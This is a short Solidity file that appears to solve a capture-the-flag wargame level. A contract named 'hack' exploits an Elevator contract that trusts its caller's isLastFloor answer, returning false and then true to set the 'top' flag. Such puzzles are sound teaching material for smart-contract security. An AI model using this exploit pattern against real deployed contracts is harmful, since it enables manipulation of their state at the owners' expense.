// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract hack {
  uint cpt = 0;
  Elevator target;
  constructor(address _address){
    target = Elevator(_address);
  }
  function isLastFloor(uint) public returns (bool){
    if(cpt == 0 ) {
      cpt+=1;
      return false;
      
    }else{
      return true;
    }
  }

  function attack() public {
    target.goTo(1);
  }
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

